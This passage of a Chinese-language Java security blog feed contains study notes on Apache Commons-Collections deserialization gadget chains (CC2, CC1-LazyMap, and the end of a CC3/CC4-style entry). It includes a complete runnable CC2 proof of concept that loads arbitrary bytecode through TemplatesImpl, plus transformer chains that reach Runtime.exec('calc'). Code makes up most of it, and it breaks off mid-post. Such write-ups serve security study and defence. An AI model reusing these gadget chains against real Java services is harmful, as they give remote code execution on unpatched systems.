class_">Class</span>[]&#123;Map.class&#125;, instance);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationDeclaredConstructor.newInstance(Target.class,proxyInstance);</span><br><span class="line"></span><br><span class="line">        serialize(o);  <span class="comment">//序列化</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>); <span class="comment">//反序列化</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span> <span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span> <span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>调用链</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">前面用LazyMap或TransformedMap都可以</span><br><span class="line"> -&gt;ChainedTransformer.transform<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">   -&gt;</span>InstantiateTransformer.transform<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">     -&gt;</span>TrAXFilter.TrAXFilter<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">       -&gt;</span>TemplatesImpl.newTransformer<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">         -&gt;</span>TemplatesImpl.newTransformer<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">           -&gt;</span>TemplatesImpl.getTransletInstance<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">             -&gt;</span>TemplatesImpl.defineTransletClasses<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">               -&gt;</span>TemplatesImpl.defineTransletClasses<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">                 -&gt;</span>TransletClassLoader.defineClass<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">                   -&gt;</span>newInstance-&gt;test.<span class="keyword">class</span></span><br></pre></td></tr></table></figure><p>反向调用分析</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.TransletClassLoader.defineClass()从自定义字节码中加载一个类，实现任意代码执行</span><br><span class="line">-&gt;</span><br><span class="line">TemplatesImpl.defineTransletClasses<span class="function"><span class="params">()</span>直接触发<span class="title">TemplatesImpl</span>.<span class="title">TransletClassLoader</span>.<span class="title">defineClass</span><span class="params">()</span></span></span><br><span class="line"><span class="function">-&gt;</span></span><br><span class="line">TemplatesImpl.getTransletInstance()中如果 _name不为空， _class为空，则会调用TemplatesImpl.defineTransletClasses()，并且将传入的恶意类进行实例化</span><br><span class="line">-&gt;</span><br><span class="line">TemplatesImpl.newTransformer<span class="function"><span class="params">()</span>直接触发<span class="title">TemplatesImpl</span>.<span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">-&gt;</span></span><br><span class="line">TrAXFilter.TrAXFilter<span class="function"><span class="params">()</span>中令传入的参数为<span class="title">TemplatesImpl</span>即可调用<span class="title">TemplatesImpl</span>.<span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">-&gt;</span></span><br><span class="line">InstantiateTransformer.transform()会获取传入参数的构造器，再将其实例化</span><br><span class="line">-&gt;</span><br><span class="line">ChainedTransformer.transform()会将传入的Transformer对象数组参数进行递归调用，省去反复嵌套</span><br><span class="line">-&gt;</span><br><span class="line">用TransformedMap或LazyMap都可以</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://www.cnblogs.com/1vxyz/p/17458691.html#gallery-18">https://www.cnblogs.com/1vxyz/p/17458691.html#gallery-18</a></p><p><a href="https://www.bilibili.com/video/BV1Zf4y1F74K/?spm_id_from=333.788&vd_source=d1346bdaaaf874724abaf92625935d94">https://www.bilibili.com/video/BV1Zf4y1F74K/?spm_id_from=333.788&amp;vd_source=d1346bdaaaf874724abaf92625935d94</a></p><p><a href="https://www.cnblogs.com/F12-blog/p/18085593">https://www.cnblogs.com/F12-blog/p/18085593</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC2</title>
      <link href="/2024/06/24/CC2/"/>
      <url>/2024/06/24/CC2/</url>
      
        <content type="html"><![CDATA[<h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>jdk：jdk8u65<br>CC：Commons-Collections 4.0<br>pom.xml 添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CC2链子分析"><a href="#CC2链子分析" class="headerlink" title="CC2链子分析"></a>CC2链子分析</h2><p>CC2 跟CC4差不多， 在CC3中我们用TemplatesImpl.newTransformer()加载恶意类</p><p>CC4是通过ChainedTransformer.transform()去调用TemplatesImpl.newTransformer()，而CC2通过InvokerTransformer.transform()反射调用TemplatesImpl.newTransformer()</p><p>所以我们把CC4后半段改下即可</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="keyword">new</span> <span class="type">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="type">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="type">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">       TransformingComparator transformingComparator = <span class="keyword">new</span> <span class="type">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="type">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">       PriorityQueue priorityQueue = <span class="keyword">new</span> <span class="type">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">       priorityQueue.add(templates);<span class="comment">//这里第一次加的值必须是templates</span></span><br><span class="line">       priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">       </span><br><span class="line">       Class c = transformingComparator.getClass();</span><br><span class="line">       Field transformerField = c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">       transformerField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       transformerField.<span class="keyword">set</span>(transformingComparator,invokerTransformer);</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>完整poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://14.Java/java test/CCtest/target/classes/org/example/test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes =&#123;code&#125; ;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformerField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformerField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformerField.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span> <span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span> <span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://www.cnblogs.com/F12-blog/p/18085593">https://www.cnblogs.com/F12-blog/p/18085593</a></p><p><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.788&vd_source=d1346bdaaaf874724abaf92625935d94">https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.788&amp;vd_source=d1346bdaaaf874724abaf92625935d94</a></p><p><a href="https://www.cnblogs.com/1vxyz/p/17478613.html">https://www.cnblogs.com/1vxyz/p/17478613.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC1-LazyMap</title>
      <link href="/2024/06/24/CC1-LazyMap/"/>
      <url>/2024/06/24/CC1-LazyMap/</url>
      
        <content type="html"><![CDATA[<h1 id="CC1-LazyMap"><a href="#CC1-LazyMap" class="headerlink" title="CC1-LazyMap"></a>CC1-LazyMap</h1><h2 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h2><p>Commons-collections3.1-3.2.1</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>CC1链除了从TransformedMap类中的方法触发transform，还可以从Lazymap类中触发</p><p>CC1链的核心</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="type">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="type">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="type">Class</span>[]&#123;<span class="keyword">String</span>.class,Class[].class&#125;,<span class="keyword">new</span> <span class="type">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="type">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="type">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="type">Class</span>[]&#123;<span class="keyword">String</span>.class&#125;,<span class="keyword">new</span> <span class="type">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> <span class="type">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>然后现在我们要用另一种方法来调用chainedTransformer对象的 transform 方法</p><h2 id="LazyMap链构造"><a href="#LazyMap链构造" class="headerlink" title="LazyMap链构造"></a>LazyMap链构造</h2><p>查看transform的用法</p><p><img src="https://bu.dusays.com/2024/06/24/6679272926a02.png" alt="屏幕截图 2024-06-11 194816.png"></p><p>LazyMap.get()方法调用了<code>factory.transform(key)</code>，具体代码</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">Object</span> <span class="built_in">get</span>(<span class="built_in">Object</span> <span class="built_in">key</span>) &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">map</span>.<span class="property">containsKey</span>(<span class="built_in">key</span>) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="built_in">Object</span> value = factory.<span class="property">transform</span>(<span class="built_in">key</span>);</span><br><span class="line">            <span class="built_in">map</span>.<span class="property">put</span>(<span class="built_in">key</span>, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">map</span>.<span class="property">get</span>(<span class="built_in">key</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>满足<code>map.containsKey(key) == false</code>时就会调用<code>factory对象</code>的<code>transform</code>方法，也就是满足<code>map</code> 中没有键 <code>key</code></p><blockquote><p>我们可以传入一个map数组中不存在的key键名即可，其实LazyMap本身就没有Key值的传递，所以这个可以直接过</p></blockquote><p>LazyMap的构造方法</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">protected LazyMap(<span class="built_in">Map</span> map, Transformer <span class="keyword">factory</span>) &#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">factory</span> == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.<span class="keyword">factory</span> = <span class="keyword">factory</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里注意到factory是可控的，将其赋值为上文的chainedTransformer，就可以调用其transform方法，但其属性为protected，只能内部访问</p><p>往上翻找到一个公共静态方法<code>decorate</code>构造</p><p><img src="https://bu.dusays.com/2024/06/24/66792728dada7.png" alt="image-20240611200656671.png"></p><p>随便传入一个map再将chainedTransformer作为factory的参数值传入就可触发chainedTransformer对象的 transform </p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ransformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.<span class="keyword">class</span>),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;<span class="built_in">String</span>.<span class="keyword">class</span>,Class[].<span class="keyword">class</span>&#125;,<span class="keyword">new</span> <span class="built_in">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;<span class="built_in">Object</span>.<span class="keyword">class</span>,<span class="built_in">Object</span>[].<span class="keyword">class</span>&#125;,<span class="keyword">new</span> <span class="built_in">Object</span>[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;<span class="built_in">String</span>.<span class="keyword">class</span>&#125;,<span class="keyword">new</span> <span class="built_in">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;<span class="built_in">Object</span>,<span class="built_in">Object</span>&gt; hashmap=<span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="built_in">Map</span>&lt;<span class="built_in">Object</span>,<span class="built_in">Object</span>&gt; lazymap= LazyMap.decorate(hashmap,chainedTransformer);</span><br><span class="line">        lazymap.<span class="keyword">get</span>(<span class="string">&quot;key&quot;</span>);<span class="comment">//随便传入一个不存在的key键名</span></span><br></pre></td></tr></table></figure><p>现在的问题就是如何调用LazyMap.get()</p><p>和TransformedMap一样通过AnnotationInvocationHandler作为入口类，<code>AnnotationInvocationHandler</code>类在 TransformedMap类所触发的cc链1中用到过，这里我们用到其 <code>invoke</code> 方法，关键代码</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title class_">Object</span> <span class="title function_">invoke</span>(<span class="params"><span class="built_in">Object</span> proxy, Method method, <span class="built_in">Object</span>[] args</span>) &#123;</span><br><span class="line">    <span class="title class_">String</span> member = method.<span class="title function_">getName</span>();</span><br><span class="line">    <span class="title class_">Class</span>&lt;?&gt;[] paramTypes = method.<span class="title function_">getParameterTypes</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">    <span class="keyword">if</span> (member.<span class="title function_">equals</span>(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.<span class="property">length</span> == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == <span class="title class_">Object</span>.<span class="property">class</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">equalsImpl</span>(args[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> (paramTypes.<span class="property">length</span> != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">toStringImpl</span>();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">hashCodeImpl</span>();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">type</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">    <span class="title class_">Object</span> result = memberValues.<span class="title function_">get</span>(member);</span><br></pre></td></tr></table></figure><p>满足两个if语句就可调用memberValues的get方法</p><p>第一个if调用的方法名不能是<code>equals</code>，调用方法的名字不为 equals即可绕过</p><p>第二个if判断了方法参数是否为0也就是无参方法，用无参调用方法绕过</p><p>故现在的问题是如何将<code>LazyMap</code>对象赋值给该类的 <code>memberValues</code>变量，以及如何调用AnnotationInvocationHandler.invoke，第一个问题虽然构造方法是私有的，我们无法调用，我们只需改变其访问权限即可任意赋值</p><p>我们发现AnnotationInvocationHandler类继承了接口InvocationHandler，代表该类可以作为动态代理的代理处理器，只要接口了<strong>InvocationHandler接口</strong>，就必须<strong>重写</strong> <strong>invoke 方法</strong>，而且在Java的动态代理机制中，在执行代理对象中的方法之前，会自动执行其代理处理器中的invoke方法</p><p>也就是说我们只需要创建一个代理对象，通过反射让其代理处理器为<code>AnnotationInvocationHandler类</code>，然后无参调用代理对象的任意方法，即可触发invoke方法</p><p>我们只需创建一个使用<code>AnnotationInvocationHandler</code>类作为处理器的代理对象，并无参调用该代理对象中的方法即可</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Map</span> proxyInstance = (<span class="built_in">Map</span>) <span class="built_in">Proxy</span>.newProxyInstance(LazyMap.<span class="keyword">class</span>.getClassLoader(), <span class="keyword">new</span> Class[]&#123;<span class="built_in">Map</span>.<span class="keyword">class</span>&#125;, instance);<span class="regexp">//</span>这里的instance就是AnnotationInvocationHandler类的实例</span><br></pre></td></tr></table></figure><blockquote><p>Proxy.newProxyInstance()接受的三个参数</p><ol><li>使用的<code>ClassLoader</code>，通常就是接口类的<code>ClassLoader</code>；</li><li>需要实现的接口数组，至少需要传入一个接口进去；</li><li>用来处理接口方法调用的自定义的<code>InvocationHandler</code>实例，这里是AnnotationInvocationHandler类的实例</li></ol></blockquote><p>然后就是如何无参调用<code>proxyInstance</code>代理对象中的方法，而恰好在AnnotationInvocationHandler类中的readObject方法中，可控的memberValues调用了entrySet这个无参方法</p><p><img src="https://bu.dusays.com/2024/06/24/6679272938f9d.png" alt="屏幕截图 2024-06-11 210121.png"></p><p>我们先用AnnotationInvocationHandler类作为代理处理器创建了一个代理对象proxyInstance，然后又通过反射创建了一个AnnotationInvocationHandler对象，并将成员属性设置为代理对象proxyInstance，反序列化后readobject自动触发代理对象的无参方法entrySet()，触发代理处理器AnnotationInvocationHandler的invoke方法，进而调用LazyMap的get方法，最后触发transform方法，从而实现CC链1</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>完整poc</p><figure class="highlight 